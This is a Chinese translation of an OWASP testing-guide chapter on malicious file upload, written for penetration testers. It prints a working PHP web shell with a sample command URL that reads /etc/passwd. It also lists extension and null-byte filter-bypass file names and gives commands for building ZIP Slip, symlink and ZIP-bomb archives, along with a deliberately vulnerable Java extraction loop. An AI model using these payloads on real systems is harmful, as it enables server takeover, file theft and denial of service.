# 测试恶意文件上传

|ID          |
|------------|
|WSTG-BUSL-09|

## 概述

许多应用程序的业务流程允许用户向其上传数据。虽然输入验证被广泛理解为基于文本的输入字段，但当接受文件时，实现更复杂。虽然许多站点基于允许（或阻止）扩展名列表实施简单限制，但这不足以防止攻击者上传具有恶意内容的合法文件类型。

与上传恶意文件相关的漏洞是独特的，因为这些"恶意"文件可以通过在上传过程中扫描文件并拒绝那些被视为恶意的业务逻辑轻松拒绝。此外，这不同于上传意外文件，因为虽然文件类型可能被接受，但文件可能仍然对系统有害。

最后，"恶意"对不同系统有不同含义，例如，可能利用SQL服务器漏洞的恶意文件在NoSQL数据存储环境中可能不被视为"恶意"。

应用程序可能允许上传包含利用或shellcode的恶意文件，而无需将它们提交到恶意文件扫描。恶意文件可能在应用程序架构的各个点被检测和停止，例如：入侵检测/防御系统、应用程序服务器防病毒软件或在文件上传时由应用程序进行防病毒扫描（可能使用SCAP进行扫描卸载）。

### 示例

此漏洞的一个常见示例是允许用户上传图像和其他媒体文件的博客或论坛等应用程序。虽然这些被认为是安全的，但如果攻击者能够上传可执行代码（如PHP脚本），这可能允许他们执行操作系统命令、读取和修改文件系统中的信息、访问后端数据库并完全入侵服务器。

## 测试目标

- 识别文件上传功能。
- 审查项目文档以识别哪些文件类型被认为是可接受的，哪些类型被认为是危险或恶意的。
    - 如果没有文档，则根据应用程序的目的考虑什么是合适的。
- 确定上传的文件是如何处理的。
- 获取或创建一组用于测试的恶意文件。
- 尝试将恶意文件上传到应用程序，并确定它是否被接受和处理。

## 如何测试

### 恶意文件类型

应用程序可以做的最简单的检查是确定只能上传哪些可信类型的文件。

#### Web Shell

如果服务器配置为执行代码，则可能通过上传称为web shell的文件在服务器上获得命令执行，这允许您执行任意代码或操作系统命令。为了使此攻击成功，文件需要上传到webroot内，并且服务器必须配置为执行代码。

将这种shell上传到面向互联网的服务器是危险的，因为它允许任何知道（或猜测）shell位置的人执行服务器上的代码。可以使用多种技术来保护shell免受未授权访问，例如：

- 使用随机生成的名称上传shell。
- 密码保护shell。
- 对shell实施基于IP的限制。

**请记住在完成后删除shell。**

下面显示了一个简单的基于PHP的shell示例，它执行传递给它的GET参数中的操作系统命令，并且只能从特定IP地址访问：

```php
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // 在此处设置您的IP地址
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```

一旦shell上传（使用随机名称），您可以通过在`cmd` GET参数中传递它们来执行操作系统命令：

`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`

#### 过滤器绕过

第一步是确定过滤器允许或阻止什么，以及在哪里实现。如果限制在客户端使用JavaScript执行，则可以使用拦截代理轻易绕过。

如果过滤在服务器端执行，则可以尝试各种技术来绕过它，包括：

- 将HTTP请求中的`Content-Type`值更改为`image/jpeg`。
- 将扩展名更改为不太常见的扩展名，如`file.php5`、`file.shtml`、`file.asa`、`file.jsp`、`file.jspx`、`file.aspx`、`file.asp`、`file.phtml`、`file.cshtml`
- 使用双扩展名，如`file.jpg.php`或`file.png.php`。为此，您必须首先了解Web服务器处理具有多个扩展名的文件的方式。例如，在某些情况下，Web服务器可能仅检查文件扩展名是否包含`.jpg`或`.png`，这可能允许攻击者绕过文件扩展名过滤器。
- 更改上传文件的[文件签名](https://en.wikipedia.org/wiki/List_of_file_signatures)或魔术字节。
- 更改扩展名的大小写，如`file.PhP`或`file.AspX`
- 如果请求包含多个文件名，请将它们更改为不同的值。
- 使用特殊尾随字符，如空格、点或空字符，如`file.asp...`、`file.php;jpg`、`file.asp%00.jpg`、`1.jpg%00.php`
- 在配置不当的Nginx版本中，上传文件为`test.jpg/x.php`可能允许将其作为`x.php`执行。
- 上传具有以下内容的`.htaccess`文件：`AddType application/x-httpd-php .png`。这将导致Apache服务器将`.png`图像执行为好像它们是`.php`资源。

**请注意，在某些情况下，您可能需要结合上述讨论的不同过滤器绕过技术以成功绕过服务器端过滤器。**

### 恶意文件内容

一旦文件类型被验证，确保文件内容也是安全的也很重要。这要困难得多，因为所需的步骤将根据允许的文件类型而变化。

#### 恶意软件

应用程序通常应扫描上传的文件与反恶意软件软件，以确保它们不包含任何恶意内容。测试这一点的最简单方法是使用[EICAR测试文件](https://www.eicar.org/download-anti-malware-testfile/)，这是一个安全文件，被所有反恶意软件软件标记为恶意。

根据应用程序的类型，可能需要测试其他危险文件类型，如包含恶意宏的Office文档。[Metasploit框架](https://github.com/rapid7/metasploit-framework)和[社会工程师工具包(SET)](https://github.com/trustedsec/social-engineer-toolkit)等工具可用于为各种格式生成恶意文件。

当上传此文件时，应用程序应检测并隔离或删除它。根据应用程序处理文件的方式，可能不明显是否发生了这种情况。

#### 存档目录遍历

如果应用程序提取存档（如ZIP文件），则可能使用目录遍历写入意外位置。这可以通过上传包含使用`..\..\..\..\shell.php`等序列遍历文件系统的路径的恶意ZIP文件来利用。此技术在[snyk咨询](https://snyk.io/research/zip-slip-vulnerability)中进一步讨论。

针对存档目录遍历的测试应包括两部分：

1. 一个恶意存档，在提取时跳出目标目录。此恶意存档应包含两个文件：一个`base`文件，提取到目标目录，以及一个`traversed`文件，尝试向上导航目录树以到达根文件夹——添加到`tmp`目录。恶意路径将包含许多级别的`../`（即`../../../../../../../../tmp/traversed`），以更好地有机会到达根目录。一旦攻击成功，测试人员可以通过ZIP slip攻击在Web服务器上找到创建的`/tmp/traversed`。
2. 使用自定义代码或库提取压缩文件的逻辑。当提取功能不验证存档中的文件路径时，存在存档目录遍历漏洞。以下显示了一个Java中易受攻击的实现示例：

```java
Enumeration<ZipEntry> entries = zip.getEntries();

while(entries.hasMoreElements()){
    ZipEntry e = entries.nextElement();
    File f = new File(destinationDir, e.getName());
    InputStream input = zip.getInputStream(e);
    IOUtils.copy(input, write(f));
}
```

按照以下步骤创建可在上传到Web服务器后滥用上述易受攻击代码的ZIP文件：

```bash
# 打开新终端并创建树结构
#（可能需要更多目录级别，取决于目标系统）
mkdir -p a/b/c
# 创建基本文件
echo 'base' > a/b/c/base
# 创建遍历文件
echo 'traversed' > traversed
# 此时您可以使用`tree`仔细检查树结构
# 导航到a/b/c根目录
cd a/b/c
# 压缩文件
zip test.zip base ../../../traversed
# 验证压缩文件内容
unzip -l test.zip
```

#### 存档符号链接攻击

如果应用程序提取存档文件（如ZIP或TAR），验证存档中包含的符号链接的处理方式很重要。与存档目录遍历（ZIP Slip）不同，此技术不依赖`../`路径遍历序列。

攻击者可以制作包含指向服务器上敏感文件（如`/etc/passwd`）的符号链接的存档。如果提取过程在不验证的情况下保留符号链接，并且应用程序稍后处理或公开提取的文件，这可能导致意外访问敏感系统文件。

例如，恶意存档可能包含：`link.txt -> /etc/passwd`

如果后端提取此存档时不验证或拒绝符号链接，并且应用程序读取`link.txt`，它可能无意中泄露`/etc/passwd`的内容。

##### 如何测试

1. 创建符号链接：`ln -s /etc/passwd link.txt`
1. 创建存档：`tar -czf malicious.tar.gz link.txt`
1. 将存档上传到应用程序。
1. 检查：
   - 符号链接是否被提取？
   - 应用程序是否跟随链接？
   - 可以访问敏感文件内容吗？

##### 影响

- 任意文件读取
- 敏感信息泄露

#### ZIP炸弹

[ZIP炸弹](https://en.wikipedia.org/wiki/zip_bomb)（更一般地称为解压缩炸弹）是一种包含大量数据的存档文件。其目的是通过在尝试提取存档时耗尽目标系统的磁盘空间或内存来导致拒绝服务。请注意，虽然ZIP格式是这方面最常用的示例，但其他格式也会受到影响，包括gzip（常用于压缩传输中的数据）。

最简单地，ZIP炸弹可以通过压缩由单个字符组成的大文件来创建。下面的示例显示如何创建1MB文件，解压后为1GB：

```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

有多种方法可以实现更高的压缩率，包括多层压缩、[滥用ZIP格式](https://www.bamsoftware.com/hacks/zipbomb/)和[quines](https://research.swtch.com/zip)（是包含自身副本的存档，导致无限递归）。

成功的ZIP炸弹攻击将导致拒绝服务，如果使用自动缩放云平台，还会增加成本。**除非您考虑了这些风险并获得书面批准，否则不要进行这种攻击。**

#### XML文件

XML文件有许多潜在漏洞，如XML外部实体（XXE）和拒绝服务攻击，如[十亿次嘲笑攻击](https://en.wikipedia.org/wiki/Billion_laughs_attack)。

这些在[测试XML注入](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)指南中进一步讨论。

#### 其他文件格式

许多其他文件格式也有需要考虑的具体安全问题，例如：

- 图像文件必须检查最大像素/帧大小。
- CSV文件可能允许[CSV注入攻击](https://owasp.org/www-community/attacks/CSV_Injection)。
- Office文件可能包含恶意宏或PowerShell代码。
- PDF可能包含恶意JavaScript。

应仔细审查允许的文件格式是否存在潜在危险功能，并在测试时尽可能尝试利用。

### 源代码审查

当支持文件上传功能时，以下API/方法在源代码中常见：

- Java：`new file`、`import`、`upload`、`getFileName`、`Download`、`getOutputString`
- C/C++：`open`、`fopen`
- PHP：`move_uploaded_file()`、`Readfile`、`file_put_contents()`、`file()`、`parse_ini_file()`、`copy()`、`fopen()`、`include()`、`require()`

## 相关测试用例

- [测试敏感信息的文件扩展名处理](../02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)
- [测试XML注入](../07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)
- [测试意外文件类型上传](08-Test_Upload_of_Unexpected_File_Types.md)

## 修复

完全保护免受恶意文件上传可能很复杂，所需的确切步骤将根据上传的文件类型以及文件在服务器上如何处理或解析而变化。这在[文件上传速查表](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)中更全面地讨论。

## 工具

- Metasploit的有效载荷生成功能
- 拦截代理

## 参考资料

- [OWASP - 文件上传速查表](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP - 不受限制的文件上传](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [为什么文件上传表单是主要安全威胁](https://www.acunetix.com/websitesecurity/upload-forms-threat/)
- [实施安全文件上传的8条基本规则](https://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads)
- [阻止人们通过表单上传恶意PHP文件](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)
- [如何判断文件是否为恶意的](https://web.archive.org/web/20210710090809/https://www.techsupportalert.com/content/how-tell-if-file-malicious.htm)
- [CWE-434：危险类型文件的不受限制上传](https://cwe.mitre.org/data/definitions/434.html)
- [实施安全文件上传](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)
- [Metasploit生成有效载荷](https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads)
- [文件签名列表](https://en.wikipedia.org/wiki/List_of_file_signatures)
